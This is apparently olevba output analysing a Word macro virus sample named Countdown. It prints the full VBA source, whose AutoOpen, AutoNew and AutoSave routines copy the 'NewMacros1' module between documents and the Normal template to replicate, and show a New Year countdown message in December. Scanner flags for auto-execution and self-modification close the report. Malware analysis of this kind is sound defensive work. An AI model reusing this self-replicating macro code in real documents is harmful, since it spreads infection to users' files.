olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Countdown
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Countdown - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros1.bas 
in file: Virus.MSWord.Countdown - OLE stream: 'Macros/VBA/NewMacros1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()

Dim bFindInTempl, bFindInDoc As Boolean
bFindInTempl = False
bFindInDoc = False

'Èùåì â àêòèâíîì äîêóìåíòå
For Each xItem In ActiveDocument.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInDoc = True
Next xItem

'Èùåì â áàçîâîì øàáëîíå
For Each xItem In NormalTemplate.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInTempl = True
Next xItem

If bFindInTempl = True And bFindInFile = True Then
Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
bFindInTempl = False
End If

'Íàøëè â øàáëîíå
If bFindInTempl = True And bFindInDoc = False Then
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

'... â äîêóìåíòå
If bFindInDoc = True And bFindInTempl = False Then
   Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

If Month(Now()) = 12 Then
Dim seconds As String
seconds = (31 - Day(Now())) * 24 * 60 * 60
Dim message As String
message = "Äî íîâîãî ãîäà îñòàëîñü: " + seconds + " ñåêóíä!"
r = MsgBox(message, vbInformation, "Ãîòîâñÿ!!!")
End If

End Sub

Sub AutoSave()

Dim bFindInTempl, bFindInDoc As Boolean
bFindInTempl = False
bFindInDoc = False

'Èùåì â àêòèâíîì äîêóìåíòå
For Each xItem In ActiveDocument.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInDoc = True
Next xItem

'Èùåì â áàçîâîì øàáëîíå
For Each xItem In NormalTemplate.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInTempl = True
Next xItem

If bFindInTempl = True And bFindInFile = True Then
Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
bFindInTempl = False
End If

'Íàøëè â øàáëîíå
If bFindInTempl = True And bFindInDoc = False Then
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

'... â äîêóìåíòå
If bFindInDoc = True And bFindInTempl = False Then
   Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

If Month(Now()) = 12 Then
Dim seconds As String
seconds = (31 - Day(Now())) * 24 * 60 * 60
Dim message As String
message = "Äî íîâîãî ãîäà îñòàëîñü: " + seconds + " ñåêóíä!"
r = MsgBox(message, vbInformation, "Ãîòîâñÿ!!!")
End If

End Sub

Sub AutoOpen()

Dim bFindInTempl, bFindInDoc As Boolean
bFindInTempl = False
bFindInDoc = False

'Èùåì â àêòèâíîì äîêóìåíòå
For Each xItem In ActiveDocument.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInDoc = True
Next xItem

'Èùåì â áàçîâîì øàáëîíå
For Each xItem In NormalTemplate.VBProject.VBComponents
If xItem.Name = "NewMacros1" _
Then bFindInTempl = True
Next xItem

If bFindInTempl = True And bFindInDoc = True Then
Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
bFindInTempl = False
End If

'Íàøëè â øàáëîíå
If bFindInTempl = True And bFindInDoc = False Then
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

'... â äîêóìåíòå
If bFindInDoc = True And bFindInTempl = False Then
   Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="NewMacros1", _
        Object:=wdOrganizerObjectProjectItems
End If

If Month(Now()) = 12 Then
Dim seconds As String
seconds = (31 - Day(Now())) * 24 * 60 * 60
Dim message As String
message = "Äî íîâîãî ãîäà îñòàëîñü: " + seconds + " ñåêóíä!"
r = MsgBox(message, vbInformation, "Ãîòîâñÿ!!!")
End If

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

